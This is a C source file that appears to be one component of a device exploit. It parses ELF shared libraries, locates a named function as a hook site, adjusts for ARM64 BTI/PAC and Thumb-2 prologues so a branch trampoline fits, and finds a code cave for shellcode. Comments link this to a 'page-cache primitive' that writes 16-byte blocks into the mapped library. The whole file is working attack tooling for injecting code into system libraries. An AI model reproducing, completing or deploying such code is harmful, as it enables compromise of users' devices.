#include <string.h>
#include <errno.h>
#include <unistd.h>
#include <fcntl.h>
#include <linux/elf.h>
#include <sys/stat.h>
#include <stdio.h>
#include <stdint.h>

/* ELF32/ELF64 aware hook-site finder.
 *
 * 64-bit targets: original behaviour (BTI/PAC preamble skip).
 * 32-bit targets: ARM/Thumb-2. Symbols carry bit0 = 1 for Thumb code, and the
 * hook site must be a 4-byte Thumb-2 instruction because the trampoline is a
 * 32-bit B.W — a 16-bit prologue is rejected.
 *
 * Cave placement is rounded up to 16 bytes: the page-cache primitive writes
 * whole 16-byte CBC blocks, and shell_off is used as the block base.
 */

#define MAX_PHDRS 32
#define MAX_SHDRS 96

struct elf_view {
    int      is64;
    uint64_t exec_off, exec_filesz, exec_vaddr;
    uint64_t dynstr, dynsym_off, dynsym_size;
    uint32_t sym_ent;
    int      is_thumb;
};

static uint64_t align_up(uint64_t v, uint64_t a)
{
    return (v + a - 1) & ~(a - 1);
}

/* Pick a 16-byte aligned slot for the shellcode inside the executable segment.
 *
 * 1. Preferred: the slack left in the last page of the segment (bytes past
 *    p_offset+p_filesz still belong to the same mapped page, zero-filled).
 *    The slot must stay inside that page and inside the file.
 * 2. Fallback: the largest zero run (alignment padding) in the segment.
 */
static int find_code_cave(int fd, const struct elf_view *ev,
                          uint64_t tail_off, size_t shellcode_size,
                          uint64_t *out_off)
{
    long pagesize = sysconf(_SC_PAGESIZE);
    struct stat st;
    uint64_t file_size = 0;
    if (fstat(fd, &st) == 0) file_size = (uint64_t)st.st_size;

    uint64_t cand = align_up(tail_off, 16);
    uint64_t page_base = cand & ~((uint64_t)pagesize - 1);
    uint64_t max_end = page_base + (uint64_t)pagesize;
    if (file_size && max_end > file_size) max_end = file_size;

    if (cand + shellcode_size <= max_end) {
        *out_off = cand;
        return 0;
    }

    printf("shellcode (%zu) does not fit in tail-page slack (%llu bytes)\n",
           shellcode_size,
           (unsigned long long)(max_end > cand ? max_end - cand : 0));

    if (lseek64(fd, (off64_t)ev->exec_off, SEEK_SET) < 0) return 1;

    uint64_t run_start = 0, run_len = 0, max_run_len = 0;
    char page[4096];
    for (uint64_t done = 0; done < ev->exec_filesz; done += sizeof(page)) {
        uint64_t chunk = ev->exec_filesz - done;
        if (chunk > sizeof(page)) chunk = sizeof(page);
        ssize_t n = read(fd, page, (size_t)chunk);
        if (n <= 0) break;
        for (ssize_t i = 0; i < n; i++) {
            if (page[i] == 0) {
                uint64_t at = ev->exec_off + done + (uint64_t)i;
                if (!run_len) run_start = at;
                run_len++;
                uint64_t slot = align_up(run_start, 16);
                if (slot + shellcode_size <= run_start + run_len &&
                    ((slot & ((uint64_t)pagesize - 1)) + shellcode_size) <= (uint64_t)pagesize) {
                    printf("using code cave at 0x%llx\n", (unsigned long long)slot);
                    *out_off = slot;
                    return 0;
                }
                if (run_len > max_run_len) max_run_len = run_len;
            } else {
                run_len = 0;
            }
        }
    }

    printf("no code cave large enough (need %zu, largest found %llu) - DEVICE NOT SUPPORTED\n",
           shellcode_size, (unsigned long long)max_run_len);
    return 1;
}

int find_hook_target(const char *libcxx, const char *symname,
                     uint64_t *hook_target, uint64_t *payload_target,
                     uint32_t *first_instruction, size_t shellcode_size,
                     int *thumb_out)
{
    *hook_target = 0;
    *payload_target = 0;
    if (thumb_out) *thumb_out = 0;

    int fd = open(libcxx, O_RDONLY);
    if (fd < 0) {
        printf("open %s failed: %s\n", libcxx, strerror(errno));
        return 1;
    }

    unsigned char ident[EI_NIDENT];
    if (read(fd, ident, sizeof(ident)) != (ssize_t)sizeof(ident)) {
        printf("read ELF ident from %s failed: %s\n", libcxx, strerror(errno));
        close(fd); return 1;
    }
    if (memcmp(ident, "\x7f" "ELF", 4) != 0) {
        printf("invalid ELF: %s\n", libcxx);
        close(fd); return 1;
    }

    struct elf_view ev;
    memset(&ev, 0, sizeof(ev));
    ev.is64 = (ident[EI_CLASS] == ELFCLASS64);

    uint64_t e_phoff, e_shoff, e_entry __attribute__((unused));
    uint16_t e_phnum, e_shentsize, e_shnum, e_shstrndx;
    uint32_t e_phentsize;

    if (lseek64(fd, 0, SEEK_SET) < 0) { close(fd); return 1; }

    if (ev.is64) {
        Elf64_Ehdr hdr;
        if (read(fd, (char *)&hdr, sizeof(hdr)) < (ssize_t)sizeof(hdr)) {
            printf("read ELF header from %s failed: %s\n", libcxx, strerror(errno));
            close(fd); return 1;
        }
        if (hdr.e_phentsize != sizeof(Elf64_Phdr)) {
            printf("invalid phentsize: %d\n", hdr.e_phentsize);
            close(fd); return 1;
        }
        e_phoff = hdr.e_phoff; e_phnum = hdr.e_phnum; e_phentsize = hdr.e_phentsize;
        e_shoff = hdr.e_shoff; e_shentsize = hdr.e_shentsize; e_shnum = hdr.e_shnum;
        e_shstrndx = hdr.e_shstrndx; e_entry = hdr.e_entry;
    } else {
        Elf32_Ehdr hdr;
        if (read(fd, (char *)&hdr, sizeof(hdr)) < (ssize_t)sizeof(hdr)) {
            printf("read ELF32 header from %s failed: %s\n", libcxx, strerror(errno));
            close(fd); return 1;
        }
        if (hdr.e_phentsize != sizeof(Elf32_Phdr)) {
            printf("invalid phentsize: %d\n", hdr.e_phentsize);
            close(fd); return 1;
        }
        e_phoff = hdr.e_phoff; e_phnum = hdr.e_phnum; e_phentsize = hdr.e_phentsize;
        e_shoff = hdr.e_shoff; e_shentsize = hdr.e_shentsize; e_shnum = hdr.e_shnum;
        e_shstrndx = hdr.e_shstrndx; e_entry = hdr.e_entry;
    }
    (void)e_phentsize; (void)e_entry;

    if (e_phnum == 0 || e_phnum > MAX_PHDRS || !e_shoff || e_shnum > MAX_SHDRS) {
        printf("unsupported ELF layout (phnum=%u shnum=%u)\n", e_phnum, e_shnum);
        close(fd); return 1;
    }

    /* ---- program headers: locate the executable PT_LOAD ---- */
    if (lseek64(fd, (off64_t)e_phoff, SEEK_SET) < 0) {
        printf("lseek64 e_phoff failed: %s\n", strerror(errno));
        close(fd); return 1;
    }
    for (int i = 0; i < e_phnum; i++) {
        uint32_t p_type, p_flags;
        uint64_t p_offset, p_filesz, p_vaddr;
        if (ev.is64) {
            Elf64_Phdr ph;
            if (read(fd, (char *)&ph, sizeof(ph)) < 0) break;
            p_type = ph.p_type; p_flags = ph.p_flags;
            p_offset = ph.p_offset; p_filesz = ph.p_filesz; p_vaddr = ph.p_vaddr;
        } else {
            Elf32_Phdr ph;
            if (read(fd, (char *)&ph, sizeof(ph)) < 0) break;
            p_type = ph.p_type; p_flags = ph.p_flags;
            p_offset = ph.p_offset; p_filesz = ph.p_filesz; p_vaddr = ph.p_vaddr;
        }
        if (p_type == PT_LOAD && (p_flags & PF_X)) {
            *payload_target = p_offset + p_filesz;
            ev.exec_off = p_offset;
            ev.exec_filesz = p_filesz;
            ev.exec_vaddr = p_vaddr;
            break;
        }
    }

    if (ev.exec_off == 0 && ev.exec_vaddr == 0) {
        printf("no executable PT_LOAD segment found in %s\n", libcxx);
        close(fd); return 1;
    }

    /* ---- section headers: .dynstr / .dynsym ---- */
    if (lseek64(fd, (off64_t)(e_shoff + (uint64_t)e_shstrndx * e_shentsize), SEEK_SET) < 0) {
        printf("lseek64 shstrndx failed: %s\n", strerror(errno));
        close(fd); return 1;
    }
    uint64_t str_shdr_off;
    if (ev.is64) {
        Elf64_Shdr s;
        if (read(fd, (char *)&s, sizeof(s)) < 0) { close(fd); return 1; }
        str_shdr_off = s.sh_offset;
    } else {
        Elf32_Shdr s;
        if (read(fd, (char *)&s, sizeof(s)) < 0) { close(fd); return 1; }
        str_shdr_off = s.sh_offset;
    }

    for (int i = 0; i < e_shnum; i++) {
        uint32_t sh_name;
        uint64_t sh_offset, sh_size;
        if (lseek64(fd, (off64_t)(e_shoff + (uint64_t)i * e_shentsize), SEEK_SET) < 0) break;
        if (ev.is64) {
            Elf64_Shdr sh;
            if (read(fd, (char *)&sh, sizeof(sh)) < 0) break;
            sh_name = sh.sh_name; sh_offset = sh.sh_offset; sh_size = sh.sh_size;
        } else {
            Elf32_Shdr sh;
            if (read(fd, (char *)&sh, sizeof(sh)) < 0) break;
            sh_name = sh.sh_name; sh_offset = sh.sh_offset; sh_size = sh.sh_size;
        }
        if (lseek64(fd, (off64_t)(str_shdr_off + sh_name), SEEK_SET) < 0) break;
        char name[100];
        ssize_t n = read(fd, name, sizeof(name) - 1);
        if (n < 0) break;
        name[n] = 0;
        if (strcmp(name, ".dynstr") == 0) ev.dynstr = sh_offset;
        if (strcmp(name, ".dynsym") == 0) { ev.dynsym_off = sh_offset; ev.dynsym_size = sh_size; }
    }

    if (!ev.dynstr || !ev.dynsym_off) {
        printf(".dynstr or .dynsym not found in %s\n", libcxx);
        close(fd); return 1;
    }

    ev.sym_ent = ev.is64 ? (uint32_t)sizeof(Elf64_Sym) : (uint32_t)sizeof(Elf32_Sym);

    for (uint64_t i = 0; i < ev.dynsym_size / ev.sym_ent; i++) {
        uint32_t st_name;
        uint64_t st_value;
        if (lseek64(fd, (off64_t)(ev.dynsym_off + i * ev.sym_ent), SEEK_SET) < 0) break;
        if (ev.is64) {
            Elf64_Sym sym;
            if (read(fd, (char *)&sym, sizeof(sym)) < 0) break;
            st_name = sym.st_name; st_value = sym.st_value;
        } else {
            Elf32_Sym sym;
            if (read(fd, (char *)&sym, sizeof(sym)) < 0) break;
            st_name = sym.st_name; st_value = sym.st_value;
        }
        if (lseek64(fd, (off64_t)(ev.dynstr + st_name), SEEK_SET) < 0) break;
        char name[200];
        ssize_t n = read(fd, name, sizeof(name) - 1);
        if (n < 0) break;
        name[n] = 0;
        if (strcmp(name, symname) == 0) {
            if (!ev.is64) {
                ev.is_thumb = (int)(st_value & 1);
                st_value &= ~(uint64_t)1;
            }
            *hook_target = st_value - ev.exec_vaddr + ev.exec_off;
            break;
        }
    }

    if (*hook_target == 0) {
        printf("symbol %s not found in %s\n", symname, libcxx);
        close(fd); return 1;
    }
    if (thumb_out) *thumb_out = ev.is_thumb;

    if (lseek64(fd, (off64_t)*hook_target, SEEK_SET) < 0) {
        printf("lseek64 hook_target failed: %s\n", strerror(errno));
        close(fd); return 1;
    }
    if (read(fd, first_instruction, sizeof(*first_instruction)) < 0) {
        printf("read first instruction failed: %s\n", strerror(errno));
        close(fd); return 1;
    }

#if defined(__aarch64__)
    for (int adv = 0; adv < 2; adv++) {
        switch (*first_instruction) {
        case 0xd503233f: /* PACIASP  */
        case 0xd503237f: /* PACIBSP  */
        case 0xd503241f: /* BTI      */
        case 0xd503245f: /* BTI c    */
        case 0xd503249f: /* BTI j    */
        case 0xd50324df: /* BTI jc   */
            printf("BTI/PAC preamble at hook site, advancing +4\n");
            *hook_target += 4UL;
            if (lseek64(fd, (off64_t)*hook_target, SEEK_SET) < 0 ||
                read(fd, first_instruction, sizeof(*first_instruction)) < 0) {
                printf("read preamble +%d failed: %s\n", (adv + 1) * 4, strerror(errno));
                close(fd); return 1;
            }
            continue;
        default:
            break;
        }
        break;
    }
#else
    if (ev.is_thumb) {
        /* The trampoline is a 4-byte B.W, so it needs a 4-byte instruction to
         * steal. Arm32 takes start functions with push {r4, lr} (0xb510, a
         * 16-bit insn) far too often - walk forward to the first 32-bit
         * Thumb-2 instruction instead of giving up. */
        uint64_t cur = *hook_target;
        int found = 0;
        for (int step = 0; step < 32; step++) {          /* up to 64 bytes */
            uint32_t w = 0;
            if (lseek64(fd, (off64_t)cur, SEEK_SET) < 0) break;
            if (read(fd, &w, 4) < 4) break;
            unsigned top = (unsigned)((w & 0xFFFFu) >> 11);
            if (top == 0x1Du || top == 0x1Eu || top == 0x1Fu) { found = 1; break; }
            cur += 2;
        }
        if (!found) {
            printf("%s: no 32-bit Thumb instruction within 64 bytes of 0x%llx\n",
                   libcxx, (unsigned long long)*hook_target);
            close(fd); return 1;
        }
        if (cur != *hook_target) {
            printf("advanced %llu bytes to the first 32-bit Thumb insn at 0x%llx\n",
                   (unsigned long long)(cur - *hook_target), (unsigned long long)cur);
            *hook_target = cur;
            if (lseek64(fd, (off64_t)cur, SEEK_SET) < 0 ||
                read(fd, first_instruction, sizeof(*first_instruction)) < 0) {
                printf("re-read at 0x%llx failed: %s\n",
                       (unsigned long long)cur, strerror(errno));
                close(fd); return 1;
            }
        }
    } else {
        printf("%s: WARNING - ARM (not Thumb) hook site, using ARM B\n", libcxx);
    }
#endif

    if (find_code_cave(fd, &ev, *payload_target, shellcode_size, payload_target)) {
        close(fd); return 1;
    }

    close(fd);
    return 0;
}
